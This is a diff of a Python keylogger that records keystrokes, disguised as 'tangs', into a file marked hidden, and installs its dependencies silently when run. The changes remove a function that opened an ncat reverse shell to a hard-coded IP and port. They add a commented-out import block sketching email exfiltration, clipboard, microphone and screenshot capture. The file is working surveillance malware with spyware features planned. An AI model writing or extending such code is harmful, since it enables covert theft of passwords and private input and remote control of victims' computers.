@@ -1,18 +1,55 @@
+########################################
+# IMPORTS
+########################################
 
-
-
-
-import os
 import ctypes
 import subprocess
 import sys
 import threading
+
+# email
+"""
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MINEText
+from email.mime.base import MIMEBase
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+# info
+
+import time
+import os
+
+# sound
+
+from scipy.io.wavfile import write
+import sounddevice as ad
+
+# crypt
+
+from cryptography.fernet import Fernet
+# pass
+
+import getpass
+from requests import get
+
+# screen
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
 # Check if the `pynput` package is installed
+"""
+########################################
+# config
+########################################
+
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'ncat'])
 from pynput.keyboard import Key, Listener
-
-
 # Hidden file attribute
 FILE_ATTRIBUTE_HIDDEN = 0x02
 
@@ -22,6 +59,10 @@ count = 0
 # List to store the pressed tang
 tangs = []
 
+########################################
+# tang
+########################################
+
 # Callback function to handle tang press events
 def on_press(tang):
     global tangs, count
@@ -30,7 +71,7 @@ def on_press(tang):
     count += 1
 
     # Print the pressed tang (optional)
-    #print("{0} pressed".format(tang))
+    print("{0} pressed".format(tang))
 
     # If the number of presses reaches 10, write the tangs to file
     if count >= 10:
@@ -69,17 +110,14 @@ def write_file(tangs):
         if not ret:
             raise ctypes.WinError()
         
-        
-# Function to run the ncat command
-def run_ncat():
-    if os.name == 'nt':
-        os.system('"start /b cmd.exe @cmd /c "cmd /k "ncat 10.80.72.21 4444 -e cmd.exe""')
-    else:
-        os.system("""osascript -e 'tell application "Terminal" to do script "ncat <ip> <port> -e /bin/zsh"'""")
+########################################
+# rs
+########################################
 
-# Start the tang listener in a separate thread
-thread = threading.Thread(target=run_ncat)
-thread.start()
+########################################
+# start
+########################################
+
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
